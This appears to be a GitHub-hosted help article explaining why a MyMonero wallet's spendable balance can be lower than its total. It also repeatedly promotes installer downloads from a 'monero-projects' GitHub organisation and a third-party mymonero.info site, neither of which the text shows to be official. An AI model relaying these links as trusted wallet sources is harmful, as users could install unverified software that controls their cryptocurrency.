<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Spendable Balance Is Low</h1>
<p align="center">Find out why the amount available to send can be less than your total wallet balance.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
The spendable balance excludes funds that are still pending or locked, and a send also needs room for its transaction fee. Check transaction status and wallet scanning before assuming that your total balance can be transferred immediately.


Prefer reading on the web? The [MyMonero spendable balance too low page](https://mymonero.info/mymonero-spendable-balance-too-low) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.

## You'll see this if
- MyMonero shows a total amount but a smaller amount available to send.
- A transfer reports insufficient funds even though XMR appears in the wallet.
- A recent incoming payment has not become available yet.
- You are trying to withdraw to an exchange or move funds to a new wallet.

## Why it happens
The wallet distinguishes funds it can currently spend from funds that are not yet available. Incoming XMR may be pending or locked while the network and wallet process activity. The wallet's scan can also be behind, so the balance or transaction history may need time to update. The fee is another part of the calculation: leaving no room for the fee can make the desired send amount unavailable even when the wallet contains enough in total.

Restored wallets can take longer to show their complete history. Restore height is the block height where scanning begins; an earlier height is safer when uncertain because it covers more history, but it takes longer. See [MyMonero restore height explained](./mymonero-restore-height-explained.md), [locked and pending balance](./mymonero-locked-pending-balance.md), and [MyMonero transaction not showing](./mymonero-transaction-not-showing.md).

MyMonero desktop's final release is v1.3.3, for Windows (.exe), macOS (.dmg), and Linux (.zip) on the [GitHub releases page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The old desktop app still opens wallets and sends XMR but is no longer maintained; no new features or security updates are provided. MyMonero hosted servers and web wallet login stopped. You may keep using desktop or restore in Cake Wallet (iOS, Android, macOS, Linux); Windows desktop builds are paused at the time of writing. Details are in [MyMonero migration guidance](./mymonero-to-cake-wallet-migration.md).

---
## Fix
1. **Compare the amounts shown.** Look for separate total, pending, locked, or spendable figures. Use the spendable figure when deciding how much you can send, rather than attempting to spend the full total.
2. **Check recent incoming transactions.** Review their status in history. If an expected payment does not appear, confirm the receiving address with the sender and consult transaction not showing. Do not ask for or disclose anybody's seed.
3. **Wait for pending funds.** Give the wallet and network time to update. Avoid repeated send attempts while the incoming value remains unavailable. A pending amount is not necessarily ready to use in a new transaction.
4. **Leave room for the fee.** When preparing a send, check the fee presented by the wallet and reduce the amount if necessary. Do not rely on an old fee estimate or instructions from an unrelated asset. If you are withdrawing to an exchange, follow the exchange's current XMR deposit requirements; see withdraw XMR from MyMonero.
5. **Check whether the wallet is current.** Allow scanning to complete. If the app appears stale, read MyMonero not syncing. Error 523 is general guidance that the server connection is unavailable, not a specific diagnosis of your funds.
6. **Review restore details if the wallet was recovered.** Confirm you restored the intended seed in a compatible wallet. A 13-word seed is MyMonero-specific and legacy; a 25-word seed is standard Monero. Make sure the restore height includes the period when you first used the wallet. Earlier is safer but slower.
7. **Verify before sending.** Check the destination address, amount, and fee in the final review. A transfer to an incorrect address may not be recoverable. Never share a seed, private keys, or password with a person claiming to adjust your spendable balance.
8. **Recheck after updating.** Once scanning is current and pending funds have changed status, look at the available amount again. Submit only a transaction that the wallet can prepare and that you have reviewed carefully.

> [!TIP]
> Make a send plan using the wallet's spendable amount and displayed fee. A total balance can include funds that cannot yet be used in a new transaction.

---
## If that did not work
If the wallet remains current but the spendable amount still differs, inspect each transaction's status and confirm you are viewing the expected wallet. If the balance is unexpectedly zero, follow MyMonero balance shows zero. If the app cannot scan, diagnose that connection or syncing issue rather than trying to unlock funds through a third-party page.

If you restored from a seed and activity is incomplete, revisit the wallet's restore options and height. MyMonero's hosted web wallet login stopped, so avoid pages that claim to re-enable it by asking for recovery words. The desktop app is no longer maintained. The MyMonero desktop repository provides its project and release information. Cake Wallet is the only alternative wallet named in this guide; check its restore support through its legitimate distribution route.

## Prevention
- Check spendable funds, pending activity, and fees before planning a transfer.
- Allow scans to complete after recovery or when history seems stale.
- Keep a private, offline backup of the complete seed and note its format.
- Confirm recipient details and exchange deposit requirements before sending.
- Ignore any person or page requesting seed words to increase an available balance.
- Keep transaction identifiers private and use official account channels for deposit issues.

## FAQ
<details><summary>Why is my spendable amount smaller than the total?</summary>

The total may include pending or locked funds, and a transaction also needs room for its fee. Check the wallet's status labels and wait for it to update.

</details>

<details><summary>Can I send while funds are pending?</summary>

Pending funds may not yet be spendable. Use the available amount the wallet reports and avoid repeated attempts to spend unavailable funds.

</details>

<details><summary>Does a lower spendable amount mean my wallet is compromised?</summary>

Not by itself. Pending funds, scanning, and fees can explain the difference. Verify the wallet and transaction history before drawing conclusions.

</details>

<details><summary>Can someone unlock the balance if I give them my seed?</summary>

No. Never share your seed. Nobody legitimate should request it to resolve a spendable-balance issue.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Import Fee Explained](./mymonero-import-fee-explained.md) | What the historical wallet import fee meant, and how to approach a prompt today. |
| [Receive XMR With a MyMonero Address](./mymonero-receive-xmr-address.md) | Find and share a receiving address safely, and confirm the incoming transaction. |
| [Install MyMonero on Windows](./install-mymonero-windows.md) | Get the final desktop release from the official project page and check the file before opening it. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
